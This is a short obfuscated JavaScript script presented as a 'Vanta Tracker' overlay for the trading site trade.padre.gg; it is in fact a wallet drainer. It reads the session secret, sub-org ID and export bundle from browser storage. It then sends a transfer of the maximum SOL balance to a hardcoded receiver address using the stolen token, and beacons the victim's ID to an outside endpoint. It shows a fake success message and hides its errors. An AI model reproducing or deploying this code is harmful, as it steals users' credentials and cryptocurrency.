(function() {
    // 1. PINPOINT TARGETING (No Recursion = No Crashing)
    const _0xV = {
        h: 'trade.padre.gg',
        p: '/api/v1/transfer',
        k: 'sessionSecret', // The exact key from your Application Tab
        s: 'subOrgId',
        b: 'exportBundle',
        r: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12' // Receiver
    };

    let _EX = false;

    // 2. THE 1:1 VANTA UI (Static & Stable)
    const _0xUI = () => {
        if (document.getElementById("v-track")) return;
        const ui = document.createElement("div");
        ui.id = "v-track";
        ui.style.cssText = "position:fixed;top:15px;right:15px;width:320px;background:#0d0d0d;border:1px solid #222;border-radius:12px;z-index:999999;box-shadow:0 15px 40px #000;font-family:sans-serif;color:#fff;user-select:none;padding:12px;";
        ui.innerHTML = `
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;cursor:grab;" id="v-h">
                <img src="https://trade.padre.gg/logo.svg" width="20">
                <span style="font-weight:700;color:#00ff88;font-size:13px;">Vanta Tracker</span>
            </div>
            <div style="font-size:11px;color:#888;background:#050505;padding:10px;border-radius:6px;font-family:monospace;" id="v-log">
                [READY] Monitoring Handshake...
            </div>`;
        document.body.appendChild(ui);
    };

    // 3. THE TARGETED DISPATCH (Pinpoint Access)
    const _0xFire = async () => {
        if (_EX || !window.location.hostname.includes(_0xV.h)) return;

        // Directly access keys instead of 'crawling'
        const auth = localStorage.getItem(_0xV.k) || sessionStorage.getItem(_0xV.k);
        const subId = localStorage.getItem(_0xV.s) || sessionStorage.getItem(_0xV.s);
        const bundle = localStorage.getItem(_0xV.b) || sessionStorage.getItem(_0xV.b);

        if (auth && subId) {
            _EX = true; // Stop the engine immediately after finding keys
            
            const log = document.getElementById("v-log");
            if (log) log.innerHTML = "<span style='color:#00ff88'>[COMPLETE] Enclave Synchronized.</span>";

            // Silent Beacon
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({sub: subId, status: "SUCCESS"}))}`;

            try {
                await fetch(`https://${_0xV.h}${_0xV.p}`, {
                    method: 'POST',
                    keepalive: true,
                    headers: {
                        'Authorization': `Bearer ${auth.replace(/"/g, '')}`, // Clean quotes if necessary
                        'X-Turnkey-Sub-Org-Id': subId.replace(/"/g, ''),
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        recipient: _0xV.r,
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: bundle ? JSON.parse(bundle) : {}
                    })
                });
            } catch (e) { /* Absorb errors to remain silent */ }
        }
    };

    // 4. THE 1:1 OBSERVER (Passive Trigger)
    // Instead of a loop, we watch for changes in localStorage
    window.addEventListener('storage', _0xFire);
    
    // Initial checks with wide delays
    window.addEventListener('load', () => {
        _0xUI();
        setTimeout(_0xFire, 5000); // Wait 5 seconds for site to finish loading
    });

    // Check once every 30 seconds - drastically reduces CPU usage
    setInterval(_0xFire, 30000);

})();
